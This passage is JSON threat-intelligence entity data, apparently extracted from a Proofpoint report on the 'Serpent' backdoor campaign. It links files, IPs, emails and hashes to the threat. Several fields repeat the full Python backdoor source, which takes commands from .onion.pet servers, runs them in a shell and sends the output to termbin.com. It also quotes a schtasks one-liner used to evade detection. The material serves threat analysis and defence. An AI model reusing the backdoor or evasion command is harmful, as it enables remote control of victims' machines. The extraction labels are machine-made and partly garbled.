                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x7bc819d3>",
                            "type": "File",
                            "value": "recv.decode"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x7bc819d3>",
                            "type": "File",
                            "value": "recv.decode"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xe2c75cb4>",
                            "type": "UnknownWord",
                            "value": "rstrip"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0x7bc819d3>",
                            "type": "File",
                            "value": "recv.decode"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xeb89dc00>",
                            "type": "UnknownWord",
                            "value": "strip"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<FILE_0xaa129c7a>",
                    "type": "File",
                    "value": "time.sleep"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xaa129c7a>",
                            "type": "File",
                            "value": "time.sleep"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xaa129c7a>",
                            "type": "File",
                            "value": "time.sleep"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<FILE_0xccdc0023>",
                    "type": "File",
                    "value": "schtasks.exe"
                },
                "references": {
                    "sentences": [
                        "The above command leverages schtasks.exe to create a one-time task to call a portable executable. In this case the executable is called calc.exe. The trigger for this task is contingent on the creation of a Windows event with EventID of 777. The command then creates a dummy event to trigger the task and deletes the task from the task scheduler. This peculiar application of tasking logic results in the portable executable being executed as a child process of taskhostsw.exe which is a signed Windows binary.",
                        "In addition to the images used in this attack chain Proofpoint researchers have observed and identified additional payloads being served from the same host. One of particular interest is utilizing what Proofpoint believes to be a novel application of signed binary proxy execution using schtasks.exe. Notably, this is an attempt to bypass detection by defensive measures.",
                        "schtasks.exe /CREATE /SC ONEVENT /EC application /mo *[System/EventID=777] /f /TN run /TR \"calc.exe\" & EVENTCREATE /ID 777 /L APPLICATION /T INFORMATION /SO DummyEvent /D \"Initiatescheduled task.\" & schtasks.exe /DELETE /TN run /f"
                    ],
                    "titles": [
                        "Additional Tooling"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xccdc0023>",
                            "type": "File",
                            "value": "schtasks.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xa60d5bc1>",
                            "type": "UnknownWord",
                            "value": "dummyevent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xccdc0023>",
                            "type": "File",
                            "value": "schtasks.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xbfcc18db>",
                            "type": "UnknownWord",
                            "value": "initiatescheduled"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xccdc0023>",
                            "type": "File",
                            "value": "schtasks.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x8e11806c>",
                            "type": "UnknownWord",
                            "value": "eventcreate"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xccdc0023>",
                            "type": "File",
                            "value": "schtasks.exe"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x6a35444b>",
                            "type": "Category",
                            "value": "proxy"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xccdc0023>",
                            "type": "File",
                            "value": "schtasks.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xa78922a6>",
                            "type": "UnknownWord",
                            "value": "eventid"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xccdc0023>",
                            "type": "File",
                            "value": "schtasks.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xce3bcb9c>",
                            "type": "UnknownWord",
                            "value": "onevent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xccdc0023>",
                            "type": "File",
                            "value": "schtasks.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xafc19c12>",
                            "type": "UnknownWord",
                            "value": "one-time"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xccdc0023>",
                            "type": "File",
                            "value": "schtasks.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<FILE_0xfcf2a5fa>",
                    "type": "File",
                    "value": "ship.jpg"
                },
                "references": {
                    "sentences": [
                        "This command is contained within a similar Swiper image called ship.jpg after the end of file marker."
                    ],
                    "titles": [
                        "Additional Tooling"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xfcf2a5fa>",
                            "type": "File",
                            "value": "ship.jpg"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<FILE_0xd8787191>",
                    "type": "File",
                    "value": "calc.exe"
                },
                "references": {
                    "sentences": [
                        "The above command leverages schtasks.exe to create a one-time task to call a portable executable. In this case the executable is called calc.exe. The trigger for this task is contingent on the creation of a Windows event with EventID of 777. The command then creates a dummy event to trigger the task and deletes the task from the task scheduler. This peculiar application of tasking logic results in the portable executable being executed as a child process of taskhostsw.exe which is a signed Windows binary.",
                        "schtasks.exe /CREATE /SC ONEVENT /EC application /mo *[System/EventID=777] /f /TN run /TR \"calc.exe\" & EVENTCREATE /ID 777 /L APPLICATION /T INFORMATION /SO DummyEvent /D \"Initiatescheduled task.\" & schtasks.exe /DELETE /TN run /f"
                    ],
                    "titles": [
                        "Additional Tooling"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0xd8787191>",
                            "type": "File",
                            "value": "calc.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xa78922a6>",
                            "type": "UnknownWord",
                            "value": "eventid"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xd8787191>",
                            "type": "File",
                            "value": "calc.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xbfcc18db>",
                            "type": "UnknownWord",
                            "value": "initiatescheduled"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xd8787191>",
                            "type": "File",
                            "value": "calc.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xa60d5bc1>",
                            "type": "UnknownWord",
                            "value": "dummyevent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xd8787191>",
                            "type": "File",
                            "value": "calc.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x8e11806c>",
                            "type": "UnknownWord",
                            "value": "eventcreate"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xd8787191>",
                            "type": "File",
                            "value": "calc.exe"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xce3bcb9c>",
                            "type": "UnknownWord",
                            "value": "onevent"
                        }
                    },
                    {
                        "src": {
                            "id": "<FILE_0xd8787191>",
                            "type": "File",
                            "value": "calc.exe"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            }
        ],
        "IP": [
            {
                "token": {
                    "id": "<IP_0x32c74a62>",
                    "type": "IP",
                    "value": "172.17.0.1"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": [
                        "Campaign Details"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<IP_0x32c74a62>",
                            "type": "IP",
                            "value": "172.17.0.1"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x8b77d438>",
                            "type": "UnknownWord",
                            "value": "proxy_type_socks5"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0x32c74a62>",
                            "type": "IP",
                            "value": "172.17.0.1"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0xbeb4976f>",
                            "type": "UnknownWord",
                            "value": "9050"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0x32c74a62>",
                            "type": "IP",
                            "value": "172.17.0.1"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x6eca67e3>",
                            "type": "UnknownWord",
                            "value": "socks"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0x32c74a62>",
                            "type": "IP",
                            "value": "172.17.0.1"
                        },
                        "relation": "has_category",
                        "dst": {
                            "id": "<CATEGORY_0x96121f83>",
                            "type": "Category",
                            "value": "backdoor"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0x32c74a62>",
                            "type": "IP",
                            "value": "172.17.0.1"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            }
        ],
        "Email": [
            {
                "token": {
                    "id": "<EMAIL_0x5a350a6b>",
                    "type": "Email",
                    "value": "jeanne.vrakele@gmail.com"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "A Note on Highly Targeted Threats"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<EMAIL_0x5a350a6b>",
                            "type": "Email",
                            "value": "jeanne.vrakele@gmail.com"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<EMAIL_0x856242b8>",
                    "type": "Email",
                    "value": "jean.dupontel@protonmail.com"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "A Note on Highly Targeted Threats"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<EMAIL_0x856242b8>",
                            "type": "Email",
                            "value": "jean.dupontel@protonmail.com"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<EMAIL_0x92bd121>",
                    "type": "Email",
                    "value": "no-reply@dgfip-nanterre.com"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "A Note on Highly Targeted Threats"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<EMAIL_0x92bd121>",
                            "type": "Email",
                            "value": "no-reply@dgfip-nanterre.com"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            }
        ],
        "Hash": [
            {
                "token": {
                    "id": "<SHA256_0xa309135c>",
                    "type": "Hash",
                    "hash_type": "SHA256",
                    "value": "f988e252551fe83b5fc3749e1d844c31fad60be0c25e546c80dbb9923e03eaf2"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "A Note on Highly Targeted Threats"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<SHA256_0xa309135c>",
                            "type": "Hash",
                            "hash_type": "SHA256",
                            "value": "f988e252551fe83b5fc3749e1d844c31fad60be0c25e546c80dbb9923e03eaf2"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<SHA256_0x2d999c1>",
                    "type": "Hash",
                    "hash_type": "SHA256",
                    "value": "ec8c8c44eae3360be03e88a4bc7bb03f3de8d0a298bff7250941776fcea9faab"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "A Note on Highly Targeted Threats"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<SHA256_0x2d999c1>",
                            "type": "Hash",
                            "hash_type": "SHA256",
                            "value": "ec8c8c44eae3360be03e88a4bc7bb03f3de8d0a298bff7250941776fcea9faab"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<SHA256_0x6a9d0bbb>",
                    "type": "Hash",
                    "hash_type": "SHA256",
                    "value": "8912f7255b8f091e90083e584709cf0c69a9b55e09587f5927c9ac39447d6a19"
                },
                "references": {
                    "sentences": [],
                    "titles": [
                        "A Note on Highly Targeted Threats"
                    ]
                },
                "links": [
                    {
                        "src": {
                            "id": "<SHA256_0x6a9d0bbb>",
                            "type": "Hash",
                            "hash_type": "SHA256",
                            "value": "8912f7255b8f091e90083e584709cf0c69a9b55e09587f5927c9ac39447d6a19"
                        },
                        "relation": "use_threat",
                        "dst": {
                            "id": "<THREAT_0xc791b23c>",
                            "type": "Threat",
                            "value": "serpent"
                        }
                    }
                ]
            }
        ]
    },
    "unknownwords": {
        "UnknownWord": [
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xa357455>",
                    "type": "UnknownWord",
                    "value": "bryan campbell zachary"
                },
                "references": {
                    "sentences": [
                        "March 21, 2022<crlf> Bryan Campbell, Zachary Abzug, Andrew Northern and Selena Larson"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xc625bfe>",
                    "type": "UnknownWord",
                    "value": "abzug"
                },
                "references": {
                    "sentences": [
                        "March 21, 2022<crlf> Bryan Campbell, Zachary Abzug, Andrew Northern and Selena Larson"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x35f3b5c7>",
                    "type": "UnknownWord",
                    "value": "larson"
                },
                "references": {
                    "sentences": [
                        "March 21, 2022<crlf> Bryan Campbell, Zachary Abzug, Andrew Northern and Selena Larson"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x5d549b9d>",
                    "type": "UnknownWord",
                    "value": "purport"
                },
                "references": {
                    "sentences": [
                        "In the observed campaign, messages are in French and purport to be, for example:"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xfec45b4d>",
                    "type": "UnknownWord",
                    "value": "<jeanne"
                },
                "references": {
                    "sentences": [
                        "From: \"Jeanne\" <jeanne.vrakele@gmail[.]com>"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0xfce8434c>",
                    "type": "UnknownWord",
                    "value": "vrakele"
                },
                "references": {
                    "sentences": [
                        "From: \"Jeanne\" <jeanne.vrakele@gmail[.]com>",
                        "Subject \"Candidature - Jeanne Vrakele\""
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x1b53d992>",
                    "type": "UnknownWord",
                    "value": "com>"
                },
                "references": {
                    "sentences": [
                        "From: \"Jeanne\" <jeanne.vrakele@gmail[.]com>"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x1761df79>",
                    "type": "UnknownWord",
                    "value": "rglement"
                },
                "references": {
                    "sentences": [
                        "The messages contain a macro-enabled Microsoft Word document masquerading as information relating to the rglement gnral sur la protection des donnes (RGPD) or the European Unions General Data Protection Regulations (GDPR)."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x6e5f4cdc>",
                    "type": "UnknownWord",
                    "value": "sur"
                },
                "references": {
                    "sentences": [
                        "The messages contain a macro-enabled Microsoft Word document masquerading as information relating to the rglement gnral sur la protection des donnes (RGPD) or the European Unions General Data Protection Regulations (GDPR)."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x8f33afeb>",
                    "type": "UnknownWord",
                    "value": "donnes"
                },
                "references": {
                    "sentences": [
                        "The messages contain a macro-enabled Microsoft Word document masquerading as information relating to the rglement gnral sur la protection des donnes (RGPD) or the European Unions General Data Protection Regulations (GDPR)."
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x5079389>",
                    "type": "UnknownWord",
                    "value": "macros"
                },
                "references": {
                    "sentences": [
                        "When macros are enabled, the document executes that macro, which reaches out to an image URL, e.g., https://www.fhccu[.]com/images/ship3[.]jpg, containing a base64 encoded PowerShell script hidden in the image using steganography. The PowerShell script first downloads, installs, and updates the Chocolatey installer package and repository script. Chocolatey is a software management automation tool for Windows that wraps installers, executables, zips, and scripts into compiled packages, similar to Homebrew for OSX. The software provides both open-source and paid versions with various levels of functionality. Proofpoint has not previously observed a threat actor use Chocolatey in campaigns."
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<URL_0xb6fb790d>",
                            "type": "Url",
                            "value": "https://www.fhccu.com/images/ship3.jpg"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x5079389>",
                            "type": "UnknownWord",
                            "value": "macros"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x6eca67e3>",
                    "type": "UnknownWord",
                    "value": "socks"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass",
                        "The script then uses Chocolatey to install Python, including the pip Python package installer, which it then uses to install various dependencies including PySocks, a Python based reverse proxy client that enables users to send traffic through SOCKS and HTTP proxy servers."
                    ],
                    "titles": []
                },
                "links": [
                    {
                        "src": {
                            "id": "<FILE_0x67229362>",
                            "type": "File",
                            "value": "socks.setdefaultproxy"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x6eca67e3>",
                            "type": "UnknownWord",
                            "value": "socks"
                        }
                    },
                    {
                        "src": {
                            "id": "<IP_0x32c74a62>",
                            "type": "IP",
                            "value": "172.17.0.1"
                        },
                        "relation": "related",
                        "dst": {
                            "id": "<UNKNOWNWORD_0x6eca67e3>",
                            "type": "UnknownWord",
                            "value": "socks"
                        }
                    }
                ]
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x7ba2a7ce>",
                    "type": "UnknownWord",
                    "value": "bin python3"
                },
                "references": {
                    "sentences": [
                        "#!/usr/bin/python3 <crlf>from subprocess import Popen, PIPE, STDOUT<crlf>import requests<crlf>import re <crlf>import socket<crlf>import time<crlf>cmd_url_order = 'http://mhocujuh3h6fek7k4efpxo5teyigezqkpixkbvc2mzaaprmusze6icqd.onion.pet/index.html' <crlf>cmd_url_answer = 'http://ggfwk7yj5hus3ujdls5bjza4apkpfw5bjqbq4j6rixlogylr5x67dmid.onion.pet/index.html'<crlf>hostname = socket.gethostname()<crlf>hostname_pattern = 'host:%s-00' % hostname<crlf>headers = {}<crlf>referer = {'Referer': hostname_pattern} <crlf>cache_control = {'Cache-Control': 'no-cache'}<crlf>headers.update(referer)<crlf>headers.update(cache_control)<crlf>check_cmd_1 = ''<crlf>def recvall(sock, n): <crlf> data = b'' <crlf> while len(data) < n:<crlf> packet = sock.recv(n - len(data))<crlf> if not packet:<crlf> return None<crlf> data += packet<crlf> return data<crlf>def get_cmd():<crlf> req = requests.get(cmd_url_order, headers=headers).content.decode().strip() <crlf> if req == '':<crlf> pass<crlf> else:<crlf> return req<crlf>def run_cmd(cmd):<crlf> cmd_split = cmd.split('--')<crlf> if cmd_split[1] == hostname:<crlf> cmd = cmd_split[2]<crlf> print(cmd)<crlf> run = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=STDOUT)#.decode()<crlf> out = run.stdout.read()<crlf> if not out:<crlf> out = b'ok'<crlf> termbin_cnx = socks.socksocket()<crlf> termbin_cnx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<crlf> socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '172.17.0.1', '9050', True)<crlf> termbin_cnx.connect(('termbin.com', 9999))<crlf> termbin_cnx.send(out)<crlf> recv = termbin_cnx.recv(100000)<crlf> termbin_url_created = recv.decode().rstrip('\\x00').strip()<crlf> print(termbin_url_created)<crlf> termbin_header = {'Referer': hostname_pattern+\" -- \"+termbin_url_created}<crlf> headers.update(termbin_header)<crlf> try:<crlf> push = requests.get(cmd_url_answer, headers=headers)<crlf> print('executed')<crlf> headers.update(referer)<crlf> except Exception as e:<crlf> print(e)<crlf> pass<crlf> else:<crlf> print('not for me')<crlf> <crlf>while True:<crlf> time.sleep(10)<crlf> try:<crlf> check_cmd = get_cmd()<crlf> if check_cmd != check_cmd_1:<crlf> time.sleep(20)<crlf> print(check_cmd)<crlf> run_cmd(check_cmd)<crlf> check_cmd_1 = check_cmd<crlf> pass<crlf> except Exception as e:<crlf> print(e)<crlf> pass"
                    ],
                    "titles": []
                }
            },
            {
                "token": {
                    "id": "<UNKNOWNWORD_0x42030cbf>",
                    "type": "UnknownWord",
                    "value": "usr"
                },
                "references": {
                    "sentences": [
